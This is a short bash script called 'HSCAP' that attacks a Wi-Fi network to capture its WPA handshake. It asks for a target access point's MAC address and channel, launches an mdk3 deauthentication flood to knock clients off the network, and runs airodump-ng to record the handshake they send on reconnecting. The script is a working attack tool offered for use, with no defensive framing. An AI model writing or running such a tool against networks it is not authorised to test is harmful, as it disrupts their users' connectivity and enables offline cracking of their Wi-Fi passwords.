#!/bin/bash

ScriptAuthor="MidNightSonne"
ScriptName="HSCAP"
ScriptVersion="1.0-1"

tmp="/tmp/"

function check_root {
	if [ $(whoami) = "root" ]; then
    echo
		echo -e " You HAVE Root Permissions ! "
    echo " --------------------------- "
	else
    echo
		echo -e " You DON'T Have Root Permissions "
		echo -e " Do: 'sudo bash $ScriptName' \n"
		exit
	fi
}

clear && echo -en "\\033]0;$ScriptName | $ScriptVersion\\a"

echo -e "\n Made With Love by $ScriptAuthor "

check_root

echo -en "\n Press [ENTER] to continue ... "
read -r continue

clear

echo -e "\n       These Are The Networks Interfaces You Have       "
echo -e " You Need To Use An Interface With \e[4mMonitor Mode\e[0m Enabled \n"

echo -en "\e[0;33m"
ip -o link show | awk -F': ' '{print $2}'
echo -en "\e[0m"

echo
read -p " Enter The Interface You Want to Use > " interface

mode=$(iwconfig "$interface" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)

if [[ $mode != "Monitor" ]]; then
  clear && echo -e "\n This Interface Is Not With Monitor Mode Enabled "
	exit
fi

clear && echo

read -p " Enter The Mac Address You Want to Deauth > " macadd

cat >"/tmp/bl.txt" <<-EOF
$macadd
EOF

clear && echo

read -p " Enter The Channel You Want to Use > " channel

echo " Capturing HandShake "

mdk3 "$interface" d -b "${tmp}bl.txt" -c "${channel}" &
processidattack=$!

airodump-ng -c "${channel}" -d "${macadd}" -w "${tmp}HandShake" "$interface" &
processidcapture=$!

sleep 12 && kill ${processidattack}
sleep 12 && kill ${processidcapture}

clear

echo
read -p " Did You Get The HandShake ? " yesno

if [[ $yesno = "y" ]] || [[ $yesno = "yes" ]]; then
  clear
  echo
  echo " Awesome ! "
  exit
else
  clear
  echo
  echo " Sorry To See That... :( "
  echo " Please Try Again ! "
  exit
fi
